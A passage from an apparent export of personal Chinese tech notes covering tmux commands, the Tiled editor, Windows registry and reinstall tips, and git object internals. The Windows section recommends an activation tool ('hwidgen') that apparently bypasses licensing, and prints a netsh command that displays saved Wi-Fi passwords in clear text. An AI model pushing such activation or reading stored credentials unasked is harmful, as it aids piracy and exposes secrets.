窗口，但是会话和里面的进程仍然在后台运行。\n`tmux ls`命令可以查看当前所有的 Tmux 会话。\n```\n$ tmux ls\n# or\n$ tmux list-session\n```\n### 接入会话\n`tmux attach`命令用于重新接入某个已存在的会话。\n```\n# 使用会话编号\n$ tmux attach -t 0\n\n# 使用会话名称\n$ tmux attach -t <session-name>\n```\n\n### 杀死会话\n`tmux kill-session`命令用于杀死某个会话。\n```\n# 使用会话编号\n$ tmux kill-session -t 0\n\n# 使用会话名称\n$ tmux kill-session -t <session-name>\n```\n### 切换会话\n`tmux switch`命令用于切换会话。\n```\n# 使用会话编号\n$ tmux switch -t 0\n\n# 使用会话名称\n$ tmux switch -t <session-name>\n```\n### 重命名会话\n`tmux rename-session`命令用于重命名会话。\n```\n$ tmux rename-session -t 0 <new-name>\n```\n上面命令将0号会话重命名。\n\n### 会话快捷键\n下面是一些会话相关的快捷键。\n- `Ctrl+b d`：分离当前会话。\n- `Ctrl+b s`：列出所有会话。\n- `Ctrl+b 2`：列出所有窗口。\n- `Ctrl+b $`：重命名当前会话。\n\n## 最简操作流程\n综上所述，以下是 Tmux 的最简操作流程。\n1. 新建会话`tmux new -s my_session`。\n2. 在 Tmux 窗口运行所需的程序。\n3. 按下快捷键`Ctrl+b d`将会话分离。\n4. 下次使用时，重新连接到会话`tmux attach-session -t my_session`。\n\n## 窗格操作\nTmux 可以将窗口分成多个窗格（pane），每个窗格运行不同的命令。以下命令都是在 Tmux 窗口中执行。\n\n### 划分窗格\n`tmux split-window`命令用来划分窗格。\n```\n# 划分上下两个窗格\n$ tmux split-window\n\n# 划分左右两个窗格\n$ tmux split-window -h\n```\n\n### 移动光标\n`tmux select-pane`命令用来移动光标位置。\n```\n# 光标切换到上方窗格\n$ tmux select-pane -U\n\n# 光标切换到下方窗格\n$ tmux select-pane -D\n\n# 光标切换到左边窗格\n$ tmux select-pane -L\n\n# 光标切换到右边窗格\n$ tmux select-pane -R\n```\n\n### 交换窗格位置\n`tmux swap-pane`命令用来交换窗格位置。\n```\n# 当前窗格上移\n$ tmux swap-pane -U\n\n# 当前窗格下移\n$ tmux swap-pane -D\n```\n\n### 窗格快捷键\n下面是一些窗格操作的快捷键。\n\n- `Ctrl+b %`: 划分左右两个窗格。\n- `Ctrl+b \"`: 划分上下两个窗格。\n- `Ctrl+b <arrow key>`: 光标切换到其他窗格。`<arrow key>`是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。\n- `Ctrl+b ;`: 光标切换到上一个窗格。\n- `Ctrl+b o`: 光标切换到下一个窗格。\n- `Ctrl+b {`: 当前窗格与上一个窗格交换位置。\n- `Ctrl+b }`: 当前窗格与下一个窗格交换位置。\n- `Ctrl+b Ctrl+o`: 所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。\n- `Ctrl+b Alt+o`: 所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。\n- `Ctrl+b x`: 关闭当前窗格。\n- `Ctrl+b !`: 将当前窗格拆分为一个独立窗口。\n- `Ctrl+b z`: 当前窗格全屏显示，再使用一次会变回原来大小。\n- `Ctrl+b Ctrl+<arrow key>`: 按箭头方向调整窗格大小。\n- `Ctrl+b q`: 显示窗格编号。\n\n## 窗口管理\n除了将一个窗口划分成多个窗格，Tmux 也允许新建多个窗口。\n### 新建窗口\n`tmux new-window`命令用来创建新窗口。\n```\n$ tmux new-window\n\n# 新建一个指定名称的窗口\n$ tmux new-window -n <window-name>\n```\n### 切换窗口\n`tmux select-window`命令用来切换窗口。\n```\n# 切换到指定编号的窗口\n$ tmux select-window -t <window-number>\n\n# 切换到指定名称的窗口\n$ tmux select-window -t <window-name>\n```\n### 重命名窗口\n`tmux rename-window`命令用于为当前窗口起名（或重命名）。\n```\n$ tmux rename-window <new-name>\n```\n### 窗口快捷键\n下面是一些窗口操作的快捷键。\n- `Ctrl+b c`: 创建一个新窗口，状态栏会显示多个窗口的信息。\n- `Ctrl+b p`: 切换到上一个窗口（按照状态栏上的顺序）。\n- `Ctrl+b n`: 切换到下一个窗口。\n- `Ctrl+b <number>`: 切换到指定编号的窗口，其中的`<number>`是状态栏上的窗口编号。\n- `Ctrl+b w`: 从列表中选择窗口。\n- `Ctrl+b ,`: 窗口重命名。\n\n## 其他命令\n下面是一些其他命令。\n```\n# 列出所有快捷键，及其对应的 Tmux 命令\n$ tmux list-keys\n\n# 列出所有 Tmux 命令及其参数\n$ tmux list-commands\n\n# 列出当前所有 Tmux 会话的信息\n$ tmux info\n\n# 重新加载当前的 Tmux 配置\n$ tmux source-file ~/.tmux.conf\n```\n"
  },
  {
    "title": "./notes/软件/tiled.md",
    "body": "# tiled的基本使用\n[官网](https://www.mapeditor.org/)\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120222902.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120222952.png\"/>\n\n点击后随便选择一个图片\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120223052.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20200120223201.png\"/>\n\n保存js文件----文件另存为。\njs中会有个data、width、height属性， 分别对应的是图片的像素(0表示没有颜色)、图片的宽有多上个像素点、高有多少个像素点"
  },
  {
    "title": "./notes/软件/window.md",
    "body": "# 禁用自带快捷键\n操作步骤如下：\n1、 右键开始—运行，输入regedit，点击确定打开注册表；\n2、 定位到\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\n3、 右键Advanced—新建—字符串值，命名为DisabledHotkeys；\n4、 双击打开DisabledHotkeys，如果要禁用Win+A，数值数据改成A，确定\n5、 如果要禁用多个快捷键，比如Win+A，Win+B等等，数值数据改成ABCDE，依次类推；\n6、 最后注销或重启系统生效，如果要恢复，只需删除数值数据的字母，或直接删除DisabledHotkeys，再次重启即可。\n\n# 删除右键内容\n1. 进入Computer\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell\n2. 分辨率、小工具、个性化具体路径：\nHKEY_CLASSES_ROOT\\DesktopBackground\\Shell\\Display；\nHKEY_CLASSES_ROOT\\DesktopBackground\\Shell\\Gadgets；\nHKEY_CLASSES_ROOT\\DesktopBackground\\Shell\\Personalize。\n以上东西删除可以需要权限， 赋权操作如下：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191030162220.png\"/>\n\n3. 显卡设置路径\nHKEY_CLASSES_ROOT\\Directory\\background\\shellex\\ContextMenuHandlers\n删除显卡对应的文件夹即可：\nace --> AMD\nigfxDTCM --> Intel\nNvCplDesktopContext --> NVIDIA\n\n# 重装window系统\n1. 下载微pe，运行pe软件，将软件装入u盘（内存卡也行）中，此时微pe会自动将该u盘分为2个区，一个区是放了该微pe系统，另一个是空闲的，可以用来存放其他任何东西\n2. 下载win10镜像， 存入到u盘中，可以去“MSDN我告诉你”网站下载，下载完成后务必进行SHA1校验（推荐使用iHasher软件），与网站核对一致后再使用，这样是为了防止数据在传输的过程中丢失\n3. 在需要安装系统的电脑上插入u盘，修改bios中的引导向为u盘启动，进入pe系统（如果电脑不能识别该u盘，则在bios中的boot secure选项设置成disable，然后将csm选项（具体什么不记得了）设置成enable即可）\n4. 进入pe系统后，点击window系统安装器软件，选择安装在u盘的win10镜像，选择要安装位置的盘符（一定要将该盘符格式化），其余选项默认即可， 然后运行进行系统映像\n5. 系统映像完成后，一般需要手动进行引导修复，具体操作：点击dimm++软件，该软件顶部会显示出识别出来的系统，点击要引导修复的系统后，下面的工具箱中有一个引导修复功能，点击即可\n6. 以上步骤执行完成后，就可以拔掉u盘，重启电脑，修改bios的引导向， 系统安装完成\n7. 由于下载的win10镜像可能不够好，所以可能新系统导致缺少一些驱动，例如无线网卡驱动，会导致无法使用无线网。如果电脑现在无法上网，可以先在其他电脑上下载一个驱动精灵到u盘中，然后再拷贝到无法上网的电脑上。点击驱动精灵，它会识别出当前电脑缺少无线网卡驱动，点击修复即可，此过程不需要网络。其他的驱动不建议使用驱动精灵来安装，建议使用易升更新系统的方式来解决\n\n注：不要在原先是win10的电脑上安装win7， 因为一些较新的硬件对win7不支持，只对win10支持，从而导致安装win7后鼠标或键盘不能使用\n\n# 激活win10\n1. 在运行窗口输入: slmgr.vbs -xpr 来查看当前电脑激活状态。注：- 前面有空格\n2. 下载hwidgen软件即可，运行该软件，采用数字激活，这样可永久激活\n3. 激活完成后，再次使用上面命令来查看激活状态，此时应该显示永久激活\n\n# 使用cmd命令行查看wifi密码\n```\nnetsh wlan show profiles\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191130181003.png\"/>\n\n```\n netsh wlan show profile name=\"广告招租\" key=clear\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191130181111.png\"/>\n\n# Windows下如何查看某个端口被谁占用\n## 查看被占用端口对应的 PID\n输入命令：\n```\nnetstat -aon|findstr \"8081\"\n```\n回车执行该命令，最后一位数字就是 PID, 这里是 9088。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210518154352.png\" width=\"700px\"/>\n\n## 查看指定 PID 的进程\n继续输入命令：\n```\ntasklist|findstr \"9088\"\n```\n回车执行该命令。\n查看是哪个进程或者程序占用了 8081 端口，结果是：node.exe。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210518154435.png\" width=\"700px\"/>\n\n## 结束进程\n强制（/F参数）杀死 pid 为 9088 的所有进程包括子进程（/T参数）：\n```\ntaskkill /T /F /PID 9088 \n```\n\n# 查看系统保留端口\nwindows 系统保留了一些端口给系统使用，我们用下面的命令可以查看：\n```\nnetsh interface ipv4 show excludedportrange protocol=tcp\n```\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210522090756.png\" width=\"700px\"/>\n\n如果其他应用想要占用这些系统保留端口，会出现如下错误：\n```\nAn attempt was made to access a socket in a way forbidden by its access permissions.\n```\n"
  },
  {
    "title": "./notes/软件/git.md",
    "body": "# Git起步\n## 三种状态\n现在请注意，如果你希望后面的学习更顺利，请记住下面这些关于 Git 的概念。 Git 有三种状态，你的文件可能处于其中之一： `已提交（committed）`、`已修改（modified）`和`已暂存（staged）`。\n- `已修改`表示修改了文件，但还没保存到数据库中。\n- `已暂存`表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。\n- `已提交`表示数据已经安全地保存在本地数据库中。\n\n## git三个分区\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/mZrQtouBSnw\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n这会让我们的 Git 项目拥有三个分区：工作区、暂存区（索引区）以及 Git 目录。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105016.png)\n\n- `工作区`操作系统上的文件，所有代码开发编辑都在这上面完成。\n- `索引区`可以理解为一个暂存区域，\n- `Git仓库目录`由Git 对象记录着每一次提交的快照，以及链式结构记录的提交变更历史。\n\n我们来看一下更新一个文件的内容这个过程会发生什么事。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/724a-imkzenp1240383.gif)\n\n运行`echo \"333\" > a.txt`将a.txt的内容从111修改成333，此时如上图可以看到，此时索引区域和git仓库没有任何变化。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/feb2-.gif)\n\n运行git add a.txt将a.txt加入到索引区域，此时如上图所示，git在仓库里面新建了一个blob object，储存了新的文件内容。并且更新了索引将a.txt指向了新建的blob object。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/60e3-imkzenp1239489.gif)\n\n运行git commit -m 'update'提交这次修改。如上图所示\nGit首先根据当前的索引生产一个tree object，充当新提交的一个快照。\n创建一个新的commit object，将这次commit的信息储存起来，并且parent指向上一个commit，组成一条链记录变更历史。\n将master分支的指针移到新的commit结点。\n\n## 初次运行 Git 前的配置 \n 既然已经在系统上安装了 Git，你会想要做几件事来定制你的 Git 环境。 每台计算机上只需要配置一次，程序升级时会保留配置信息。 你可以在任何时候再次通过运行命令来修改它们。\n\nGit 自带一个`git config`的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：\n-`/etc/gitconfig`文件: 包含系统上每一个用户及他们仓库的通用配置。 如果在执行`git config`时带上 `--system`选项，那么它就会读写该文件中的配置变量。（由于它是系统配置文件，因此你需要管理员或超级用户权限来修改它。）\n- `~/.gitconfig`或`~/.config/git/config`文件：只针对当前用户。 你可以传递`--global`选项让 Git 读写此文件，这会对你系统上 所有 的仓库生效。\n\n- 当前使用仓库的 Git 目录中的`config`文件（即 .git/config）：针对该仓库。 你可以传递`--local` 选项让 Git 强制读写此文件，虽然默认情况下用的就是它。。 （当然，你需要进入某个 Git 仓库中才能让该选项生效。）\n\n每一个级别会覆盖上一级别的配置，所以`.git/config`的配置变量会覆盖`/etc/gitconfig`中的配置变量。\n\n在 Windows 系统中，Git 会查找`$HOME`目录下（一般情况下是`C:\\Users\\$USER`）的`.gitconfig`文件。 Git 同样也会寻找`/etc/gitconfig`文件，但只限于`MSys`的根目录下，即安装 Git 时所选的目标位置。 如果你在 Windows 上使用 Git 2.x 以后的版本，那么还有一个系统级的配置文件，Windows XP 上在 `C:\\Documents and Settings\\All Users\\Application Data\\Git\\config`，Windows Vista 及更新的版本在`C:\\ProgramData\\Git\\config`。此文件只能以管理员权限通过`git config -f <file>`来修改。\n\n你可以通过以下命令查看所有的配置以及它们所在的文件：\n```shell\n$ git config --list --show-origin\n```\n\n### 用户信息\n安装完 Git 之后，要做的第一件事就是设置你的用户名和邮件地址。 这一点很重要，因为每一个 Git 提交都会使用这些信息，它们会写入到你的每一次提交中，不可更改：\n```shell\n$ git config --global user.name \"John Doe\"\n$ git config --global user.email johndoe@example.com\n```\n再次强调，如果使用了`--global`选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有`--global`选项的命令来配置。\n\n很多 GUI 工具都会在第一次运行时帮助你配置这些信息\n\n### 文本编辑器\n既然用户信息已经设置完毕，你可以配置默认文本编辑器了，当 Git 需要你输入信息时会调用它。 如果未配置，Git 会使用操作系统默认的文本编辑器。\n\n如果你想使用不同的文本编辑器，例如 Emacs，可以这样做：\n```shell\n$ git config --global core.editor emacs\n```\n在 Windows 系统上，如果你想要使用别的文本编辑器，那么必须指定可执行文件的完整路径。 它可能随你的编辑器的打包方式而不同。\n\n对于 Notepad++，一个流行的代码编辑器来说，你可能想要使用 32 位的版本， 因为在本书编写时 64 位的版本尚不支持所有的插件。 如果你在使用 32 位的 Windows 系统，或在 64 位系统上使用 64 位的编辑器，那么你需要输入如下命令：\n```shell\n$ git config --global core.editor \"'C:/Program Files/Notepad++/notepad++.exe' -multiInst -notabbar -nosession -noPlugin\"\n```\n\n### 分页器\n配置项`core.pager`用于指定 Git 运行诸如`git log`、`git diff`等所使用的分页器，可以设置成`more`或者任何你喜欢的分页器（默认用的是`less`，也就是在新窗口打开）, 当然你也可以什么都不用，设置空字符串：\n```shell\n$ git config --global core.pager ''\n```\n### 别名\nGit 并不会在你输入部分命令时自动推断出你想要的命令。 如果不想每次都输入完整的 Git 命令，可以通过`git config`文件来轻松地为每一个命令设置一个别名。 这里有一些例子你可以试试：\n```shell\n$ git config --global alias.ci commit\n```\n这意味着，当要输入`git commit`时，只需要输入`git ci`。 随着你继续不断地使用 Git，可能也会经常使用其他命令，所以创建别名时不要犹豫。\n在创建你认为应该存在的命令时这个技术会很有用。 例如，为了解决取消暂存文件的易用性问题，可以向 Git 中添加你自己的取消暂存别名：\n```shell\n$ git config --global alias.unstage 'reset HEAD --'\n```\n这会使下面的两个命令等价：\n```shell\n$ git unstage fileA\n$ git reset HEAD -- fileA\n```\n\n### 检查配置信息\n如果想要检查你的配置，可以使用`git config --list`命令来列出所有 Git 当时能找到的配置。\n```shell\n$ git config --list\nuser.name=John Doe\nuser.email=johndoe@example.com\ncolor.status=auto\ncolor.branch=auto\ncolor.interactive=auto\ncolor.diff=auto\n...\n```\n你可能会看到重复的变量名，因为 Git 会从不同的文件中读取同一个配置（例如：`/etc/gitconfig`与`~/.gitconfig`）。 这种情况下，Git 会使用它找到的每一个变量的最后一个配置。\n\n你可以通过输入`git config <key>`： 来检查 Git 的某一项配置\n```shell\n$ git config user.name\nJohn Doe\n```\n\n>Note\n由于 Git 会从多个文件中读取同一配置变量的不同值，因此你可能会在其中看到意料之外的值而不知道为什么。 此时，你可以查询 Git 中该变量的 原始 值，它会告诉你哪一个配置文件最后设置了该值：\n```shell\n$ git config --show-origin rerere.autoUpdate\nfile:/home/johndoe/.gitconfig\tfalse\n```\n\n### 获取帮助\n若你使用 Git 时需要获取帮助，有三种等价的方法可以找到 Git 命令的综合手册（manpage）：\n```shell\n$ git help <verb>\n$ git <verb> --help\n$ man git-<verb>\n```\n例如，要想获得`git config`命令的手册，执行\n```shell\n$ git help config\n```\n这些命令很棒，因为你随时随地可以使用而无需联网。 如果你觉得手册或者本书的内容还不够用，你可以尝试在 Freenode IRC 服务器 https://freenode.net 上的`#git`或`#github`频道寻求帮助。 这些频道经常有上百人在线，他们都精通 Git 并且乐于助人。\n\n此外，如果你不需要全面的手册，只需要可用选项的快速参考，那么可以用`-h`选项获得更简明的 “help” 输出：\n```shell\n$ git add -h\nusage: git add [<options>] [--] <pathspec>...\n\n    -n, --dry-run         dry run\n    -v, --verbose         be verbose\n\n    -i, --interactive     interactive picking\n    -p, --patch           select hunks interactively\n    -e, --edit            edit current diff and apply\n    -f, --force           allow adding otherwise ignored files\n    -u, --update          update tracked files\n    --renormalize         renormalize EOL of tracked files (implies -u)\n    -N, --intent-to-add   record only the fact that the path will be added later\n    -A, --all             add changes from all tracked and untracked files\n    --ignore-removal      ignore paths removed in the working tree (same as --no-all)\n    --refresh             don't add, only refresh the index\n    --ignore-errors       just skip files which cannot be added because of errors\n    --ignore-missing      check if - even missing - files are ignored in dry run\n    --chmod (+|-)x        override the executable bit of the listed files\n```\n\n\n# Git底层命令\n## 初始化新仓库\n命令：git init\n解析：要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：git init\n作用：初始化后，在当前目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。不过目前，仅仅是按照既有的结构框架初始化好了里边所有的文件和目录，但我们还没有开始跟踪管理项目中的任何一个文件。\n\n## .git 目录\n|目录/文件|说明|\n|---|---|\n|hooks/| 目录包含客户端或服务端的钩子脚本(hook scripts)|\n|info/| 包含一个全局性排除（global exclude）文件， 用以放置那些不希望被记录在`.gitignore`文件中的忽略模式(ignored patterns)|\n|logs| 保存日志信息|\n|objects/| 目录存储所有数据内容；|\n|refs/| 目录存储指向数据（分支、远程仓库和标签等）的提交对象的指针|\n|config| 文件包含项目特有的配置选项|\n|description| 用来显示对仓库的描述信息|\n|HEAD |文件指示目前被检出的分支|\n|index| 文件保存暂存区信息|\n\n## git对象\ngit对象包括三种：blog对象（数据对象）、Tree对象（树对象）、Commit对象（提交对象）\n<font color=\"red\">git对象一旦创建，就不会被更改</font>\n\n### Blob对象\nGit 的核心部分是一个**简单的键值对数据库**。即Git对象是Map类型；你可以向该数据库插入任意类型的内容，它会返回一个键值，通过该键值可以在任意时刻再次检索该内容, **其中key是value的hash值**\nGit 是一个内容寻址文件系统，听起来很酷。但这是什么意思呢？ 这意味着，Git 的核心部分是一个简单的键值对数据库（key-value data store）。 你可以向 Git 仓库中插入任意类型的内容，它会返回一个唯一的键，通过该键可以在任意时刻再次取回该内容。\n\n可以通过底层命令`git hash-object`来演示上述效果——该命令可将任意数据保存于`.git/objects`目录（即对象数据库），并返回指向该数据对象的唯一的键。\n\n首先，我们需要初始化一个新的 Git 版本库，并确认`objects`目录为空：\n```shell\n$ git init test\nInitialized empty Git repository in /tmp/test/.git/\n$ cd test\n$ find .git/objects\n.git/objects\n.git/objects/info\n.git/objects/pack\n$ find .git/objects -type f\n```\n可以看到 Git 对`objects`目录进行了初始化，并创建了`pack`和`info`子目录，但均为空。 接着，我们用`git hash-object`创建一个新的数据对象并将它手动存入你的新Git数据库中：\n```shell\n$ echo 'test content' | git hash-object -w --stdin\nd670460b4b4aece5915caf5c68d12f560a9fe3e4\n```\n在这种最简单的形式中，`git hash-object`会接受你传给它的东西，而它只会返回可以存储在Git仓库中的唯一键。 `-w`选项会指示该命令不要只返回键，还要将该对象写入数据库中。 最后，`--stdin`选项则指示该命令从标准输入读取内容；若不指定此选项，则须在命令尾部给出待存储文件的路径。\n\n此命令输出一个长度为 40 个字符的校验和。 这是一个`SHA-1`哈希值——一个将待存储的数据外加一个头部信息（header）一起做`SHA-1`校验运算而得的校验和。后文会简要讨论该头部信息。 现在我们可以查看Git是如何存储数据的：\n```\n$ find .git/objects -type f\n.git/objects/d6/70460b4b4aece5915caf5c68d12f560a9fe3e4\n```\n如果你再次查看`objects`目录，那么可以在其中找到一个与新内容对应的文件。 这就是开始时Git存储内容的方式——一个文件对应一条内容， 以该内容加上特定头部信息一起的`SHA-1`校验和为文件命名。 校验和的前两个字符用于命名子目录，余下的`38`个字符则用作文件名。\n\n一旦你将内容存储在了对象数据库中，那么可以通过`cat-file`命令从Git那里取回数据。 这个命令简直就是一把剖析Git对象的瑞士军刀。 为`cat-file`指定`-p`选项可指示该命令自动判断内容的类型，并为我们显示大致的内容：\n```shell\n$ git cat-file -p d670460b4b4aece5915caf5c68d12f560a9fe3e4\ntest content\n```\n至此，你已经掌握了如何向 Git 中存入内容，以及如何将它们取出。 我们同样可以将这些操作应用于文件中的内容。 例如，可以对一个文件进行简单的版本控制。 首先，创建一个新文件并将其内容存入数据库：\n```shell\n$ echo 'version 1' > test.txt\n$ git hash-object -w test.txt\n83baae61804e65cc73a7201a7252750c76066a30\n```\n接着，向文件里写入新内容，并再次将其存入数据库：\n```shell\n$ echo 'version 2' > test.txt\n$ git hash-object -w test.txt\n1f7a7a472abf3dd9643fd615f6da379c4acb3e3a\n```\n对象数据库记录下了该文件的两个不同版本，当然之前我们存入的第一条内容也还在：\n```shell\n$ find .git/objects -type f\n.git/objects/1f/7a7a472abf3dd9643fd615f6da379c4acb3e3a\n.git/objects/83/baae61804e65cc73a7201a7252750c76066a30\n.git/objects/d6/70460b4b4aece5915caf5c68d12f560a9fe3e4\n```\n现在可以在删掉 test.txt 的本地副本，然后用 Git 从对象数据库中取回它的第一个版本：\n```shell\n$ rm test.txt\n$ git cat-file -p 83baae61804e65cc73a7201a7252750c76066a30 > test.txt\n$ cat test.txt\nversion 1\n```\n或者第二个版本：\n```shell\n$ rm test.txt\n$ git cat-file -p 1f7a7a472abf3dd9643fd615f6da379c4acb3e3a > test.txt\n$ cat test.txt\nversion 2\n```\n然而，记住文件的每一个版本所对应的`SHA-1`值并不现实；另一个问题是，在这个（简单的版本控制）系统中，文件名并没有被保存——我们仅保存了文件的内容。 上述类型的对象我们称之为`数据对象（blob object）`。 利用`git cat-file -t`命令，可以让Git告诉我们其内部存储的任何对象类型，只要给定该对象的`SHA-1`值：\n```shell\n$ git cat-file -t 1f7a7a472abf3dd9643fd615f6da379c4acb3e3a\nblob\n```\n\n#### blob对象储存的是全新的文件快照还是储存文件的变更部分\nGit储存的是全新的文件快照，而不是文件的变更记录。也就是说，就算你只是在文件中添加一行，Git也会新建一个全新的blob object。那这样子是不是很浪费空间呢?\n这其实是Git在空间和时间上的一个取舍，思考一下你要checkout一个commit，或对比两个commit之间的差异。如果Git储存的是问卷的变更部分，那么为了拿到一个commit的内容，Git都只能从第一个commit开始，然后一直计算变更，直到目标commit，这会花费很长时间。而相反，Git采用的储存全新文件快照的方法能使这个操作变得很快，直接从快照里面拿取内容就行了。\n当然，在涉及网络传输或者Git仓库真的体积很大的时候，Git会有垃圾回收机制gc，不仅会清除无用的object，还会把已有的相似object打包压缩\n\n### 树对象\n接下来要探讨的 Git 对象类型是树对象（tree object），它能解决文件名保存的问题，也允许我们将多个文件组织到一起。 Git 以一种类似于 UNIX 文件系统的方式存储内容，但作了些许简化。 所有内容均以树对象和数据对象的形式存储，其中树对象对应了 UNIX 中的目录项，数据对象则大致上对应了`inodes`或文件内容。 一个树对象包含了一条或多条树对象记录（tree entry），每条记录含有一个指向数据对象或者子树对象的 SHA-1 指针，以及相应的模式、类型、文件名信息。 例如，某项目当前对应的最新树对象可能是这样的：\n```shell\n$ git cat-file -p master^{tree}\n100644 blob a906cb2a4a904a152e80877d4088654daad0c859      README\n100644 blob 8f94139338f9404f26296befa88755fc2598c289      Rakefile\n040000 tree 99f1a6d12cb4b6f19c8655fca46c3ecf317074e0      lib\n```\n\n`master^{tree}`语法表示`master`分支上最新的提交所指向的树对象。 请注意，`lib`子目录（所对应的那条树对象记录）并不是一个数据对象，而是一个指针，其指向的是另一个树对象：\n```shell\n$ git cat-file -p 99f1a6d12cb4b6f19c8655fca46c3ecf317074e0\n100644 blob 47c6340d6459e05787f644c2447d2595f5d3a54b      simplegit.rb\n```\n>Note\n你可能会在某些 shell 中使用 master^{tree} 语法时遇到错误。\n在 Windows 的 CMD 中，字符 ^ 被用于转义，因此你必须双写它以避免出现问题：git cat-file -p master^^{tree}。 在 PowerShell 中使用字符 {} 时则必须用引号引起来，以此来避免参数解析错误：git cat-file -p 'master^{tree}'。\n在 ZSH 中，字符 ^ 被用在通配模式（globbing）中，因此你必须将整个表达式用引号引起来：git cat-file -p \"master^{tree}\"。\n\n从概念上讲，Git 内部存储的数据有点像这样：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105310.png)\n\n\n你可以轻松创建自己的树对象。 通常，Git 根据某一时刻暂存区（即 index 区域，下同）所表示的状态创建并记录一个对应的树对象， 如此重复便可依次记录（某个时间段内）一系列的树对象。 因此，为创建一个树对象，首先需要通过暂存一些文件来创建一个暂存区。 可以通过底层命令`git update-index`为一个单独文件——我们的`test.txt`文件的首个版本——创建一个暂存区。 利用该命令，可以把`test.txt`文件的首个版本人为地加入一个新的暂存区。 必须为上述命令指定`--add`选项，因为此前该文件并不在暂存区中（我们甚至都还没来得及创建一个暂存区呢）； 同样必需的还有`--cacheinfo`选项，文件模式、`SHA-1`与文件名,因为将要添加的文件位于 Git 数据库中，而不是位于当前目录下。如果将要添加的文件不位于Git数据库中，而在当前目录下，那么只需要写上文件名即可,例`git update-index --add new.txt`\n```shell\n$ git update-index --add --cacheinfo 100644 83baae61804e65cc73a7201a7252750c76066a30 test.txt\n```\n\n本例中，我们指定的文件模式为 100644，表明这是一个普通文件。 其他选择包括：100755，表示一个可执行文件；120000，表示一个符号链接。 这里的文件模式参考了常见的 UNIX 文件模式，但远没那么灵活——上述三种模式即是 Git 文件（即数据对象）的所有合法模式（当然，还有其他一些模式，但用于目录项和子模块）。\n\n现在，可以通过`git write-tree`命令将暂存区内容写入一个树对象。 此处无需指定`-w`选项——如果某个树对象此前并不存在的话，当调用此命令时， 它会根据当前暂存区状态自动创建一个新的树对象：\n```shell\n$ git write-tree\nd8329fc1cc938780ffdd9f94e0d364e0ea74f579\n$ git cat-file -p d8329fc1cc938780ffdd9f94e0d364e0ea74f579\n100644 blob 83baae61804e65cc73a7201a7252750c76066a30      test.txt\n```\n不妨用之前见过的`git cat-file`命令验证一下它确实是一个树对象：\n```shell\n$ git cat-file -t d8329fc1cc938780ffdd9f94e0d364e0ea74f579\ntree\n```\n接着我们来创建一个新的树对象，它包括 test.txt 文件的第二个版本，以及一个新的文件：\n```shell\n$ echo 'new file' > new.txt\n$ git update-index --add --cacheinfo 100644 1f7a7a472abf3dd9643fd615f6da379c4acb3e3a test.txt\n$ git update-index --add new.txt\n```\n暂存区现在包含了 test.txt 文件的新版本，和一个新文件：new.txt。 记录下这个目录树（将当前暂存区的状态记录为一个树对象），然后观察它的结构：\n```shell\n$ git write-tree\n0155eb4229851634a0f03eb265b69f5a2d56f341\n$ git cat-file -p 0155eb4229851634a0f03eb265b69f5a2d56f341\n100644 blob fa49b077972391ad58037050f2a75f74e3671e92      new.txt\n100644 blob 1f7a7a472abf3dd9643fd615f6da379c4acb3e3a      test.txt\n```\n我们注意到，新的树对象包含两条文件记录，同时 test.txt 的 SHA-1 值（1f7a7a）是先前值的“第二版”。 只是为了好玩：你可以将第一个树对象加入第二个树对象，使其成为新的树对象的一个子目录。 通过调用`git read-tree` 命令，可以把树对象读入暂存区。 本例中，可以通过对该命令指定`--prefix`选项，将一个已有的树对象作为子树读入暂存区：\n```shell\n$ git read-tree --prefix=bak d8329fc1cc938780ffdd9f94e0d364e0ea74f579\n$ git write-tree\n3c4e9cd789d88d8d89c1073707c3585e41b0e614\n$ git cat-file -p 3c4e9cd789d88d8d89c1073707c3585e41b0e614\n040000 tree d8329fc1cc938780ffdd9f94e0d364e0ea74f579      bak\n100644 blob fa49b077972391ad58037050f2a75f74e3671e92      new.txt\n100644 blob 1f7a7a472abf3dd9643fd615f6da379c4acb3e3a      test.txt\n```\n如果基于这个新的树对象创建一个工作目录，你会发现工作目录的根目录包含两个文件以及一个名为`bak`的子目录，该子目录包含`test.txt`文件的第一个版本。 可以认为Git内部存储着的用于表示上述结构的数据是这样的：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105027.png)\n\n### 提交对象\n如果你做完了以上所有操作，那么现在就有了三个树对象，分别代表我们想要跟踪的不同项目快照。 然而问题依旧：若想重用这些快照，你必须记住所有三个`SHA-1`哈希值。 并且，你也完全不知道是谁保存了这些快照，在什么时刻保存的，以及为什么保存这些快照。 而以上这些，正是提交对象（commit 